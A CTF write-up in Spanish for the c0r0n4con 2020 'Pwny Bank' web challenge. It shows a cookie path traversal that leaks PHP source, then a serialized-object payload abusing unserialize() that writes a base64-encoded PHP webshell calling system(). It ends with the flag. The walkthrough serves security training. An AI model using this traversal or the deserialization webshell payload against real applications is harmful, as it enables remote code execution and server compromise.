### c0r0n4con CTF 2020

##### Challenge: Pwny Bank

##### Category: Web

##### Points: 250

##### Solves: 87/362

##### Description: The latest launched application allows bank users to generate their passwords. It seems its administrator are too lazy to properly configure the password's manager, will you be able to find out the hidden functionality?

![web250](https://user-images.githubusercontent.com/38633962/79078110-6a9a6300-7d06-11ea-84a5-fc33843e06d7.png)

Tras acceder a la web y analizar el código fuente, se pudo visualizar el siguiente comentario:
```html
<!--(admin notes)Only administrator can manage this secure password store server. Since we're lazy, we take advantage to properly manage user passwords via GET.-->
```
Al visualizar las cookies se vio la varible "user=pwnyBank", así que tras cambiar "pwnyBank" por "admin" se vio que uno de los mensajes de la web cambiaba, por lo que parceía que había algo detrás de ello.

En el archivo "/robots.txt", se podían encontrar las siguientes entradas:
```txt
User-agent: *
Disallow: backup.txt
Disallow: /tmp
Disallow: /info
```
Al acceder a "/backup.txt" se recibía "MOVED OUTSIDE WEBDIR FOR SECURITY REASONS" y al acceder a "/info" se encontraban dos archivos .txt: "admin.txt" y "pwnyBank.txt", así que parecía ser que el campo "user" de la cookie incluía uno de estos ficheros (concatenando ".txt"). Por lo que se le pasó a la cookie "user=../../backup", y se obtuvo el siguiente código:

```php
<p>Welcome to ../../backup</p><p><strong>Summary:</strong></p><p><pre>class SecurePasswordManager{
    function __construct() {
    }
    
   
    function __destruct() {
            $sid = session_id();
            mkdir("/app/public/tmp/{$sid}/");
            $filesize = file_put_contents("/app/public/tmp/{$sid}/{$this->filename}", $this->content);
            $filename = "/app/public/tmp/{$sid}/{$this->filename}";
            if ($filesize === 48){
                    echo "Administrator feauture: Uploaded user password file";
                    $password = file_get_contents($filename);
                    $content= base64_decode($password);
                    $file = fopen($filename, 'w');    
                    fwrite($file, $content);
                    fclose($file);
                    echo "[+] Debug: Done";
	    }
	    else {
	    unlink($filename);
	    }
    }
}

$data = unserialize($_GET['data']);
```

Tras analizar el código, parecía un fallo de *unserialize*, ya que se le pasaba directamente el parámetro GET "data" a unserialize. Así que se debía crear un nuevo objeto para que se ejecutase lo que nosotros queríamos al entrar en "__destruct()".

Las condiciones de ejecución eran que el contenido de "content" fuese en base64 y que tuviera una longitud de 48. Así que con estas condiciones, se podía crear por ejemplo el siguiente payload que nos permitía crear una webshell en "*/tmp/{$sid}/{$this->filename}*":

```
?data=O:21:"SecurePasswordManager":2:{s:8:"filename";s:5:"l.php";s:7:"content";s:48:"PD9waHAgc3lzdGVtKCRfR0VUWydlZWVlZWVlZSddKTs/Pg==";}"
```

Analizando el comportamiento de la web se detectó que el contenido de "/tmp/..." variaba cada 2 segundos aproximadamente, así que se hizo un mini script para automatizar el proceso de creación del objecto y acceso al recurso creado.

Tras varias pruebas, se identificó que en el directorio raíz del servidor había un archivo llamado "flag.9f734b1948ae016cd9d01b0f12ffc8be6af2659e87372d78e1a5751d0a74fb2f95206e076c12bfbe8b41bed106f5b79787a329621ae9a1ebb8f056f878816a74" y tras mostrar su contenido se obtuvo el flag esperado:
```
flag{n41v3n0m_w4p0}
```


